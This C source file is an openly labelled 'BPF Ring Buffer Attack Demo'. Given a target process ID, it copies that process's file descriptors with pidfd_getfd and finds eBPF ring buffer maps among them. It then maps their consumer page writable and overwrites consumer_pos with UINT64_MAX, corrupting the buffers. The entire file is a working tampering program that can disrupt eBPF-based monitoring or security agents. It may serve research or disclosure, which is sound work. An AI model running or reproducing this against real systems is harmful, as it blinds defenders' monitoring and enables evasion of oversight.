#define _GNU_SOURCE
#include "common.h"

struct ring_buffer {
    atomic_ulong *consumer_pos;
    atomic_ulong *producer_pos;
    void *data;
};

int is_bpf_ringbuf_map(int fd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", fd);

    FILE *fp = fopen(path, "r");
    if (!fp) return 0;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "map_type:", 9) == 0) {
            int type = atoi(line + 9);
            fclose(fp);
            return (type == BPF_MAP_TYPE_RINGBUF);
        }
    }

    fclose(fp);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "please provide process id. \n usage: %s <pid>\n", argv[0]);
        return 1;
    }
    pid_t pid = atoi(argv[1]);
    int pidfd = pidfd_open(pid);
    if (pidfd < 0) {
        perror("pidfd_open");
        return 1;
    }
    printf("********************* BPF Ring Buffer Attack Demo *********************\n");
    printf("scanning pid %d for fds matching bpf ring buffers.\n", pid);
    int found = 0;
    for (int fd_num = 0; fd_num < MAX_FD_TRY; fd_num++) {
        int fd = pidfd_getfd(pidfd, fd_num);
        if (fd < 0)
            continue;

        if (!is_bpf_ringbuf_map(fd)) {
            close(fd);
            continue;
        }
        printf("found bpf ring buffer map targetfd %d (map_fd: %d).\n", fd_num, fd);
        found++;
        struct ring_buffer r = {0};
        void *tmp = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (tmp == MAP_FAILED) {
            perror("mmap consumer_pos");
            close(fd);
            continue;
        }
        r.consumer_pos = (atomic_ulong *)tmp;
        size_t mmap_sz = 2*PAGE_SIZE; // we don't know the actual size so let's just map one page
        tmp = mmap(NULL, mmap_sz, PROT_READ, MAP_SHARED, fd, PAGE_SIZE);
        if (tmp == MAP_FAILED) {
            perror("mmap producer_pos + data");
            munmap((void *)r.consumer_pos, PAGE_SIZE);
            close(fd);
            continue;
        }
        r.producer_pos = (atomic_ulong *)tmp;
        r.data = tmp + PAGE_SIZE;

        printf("found producer_pos: %lu\n", atomic_load_explicit(r.producer_pos, memory_order_acquire));
        printf("found consumer_pos: %lu\n", atomic_load_explicit(r.consumer_pos, memory_order_relaxed));
        atomic_store_explicit(r.consumer_pos, UINT64_MAX, memory_order_release);
        printf("consumer_pos for ring buffer %d has been corrupted.\n", fd);
        munmap((void *)r.consumer_pos, PAGE_SIZE);
        munmap((void *)r.producer_pos, mmap_sz);
        close(fd);
    }

    if (found == 0) {
        printf("no bpf ring buffer maps found in pid %d.\n", pid);
    } else {
        printf("processed %d bpf ring buffer map(s).\n", found);
    }

    close(pidfd);
    return 0;
}
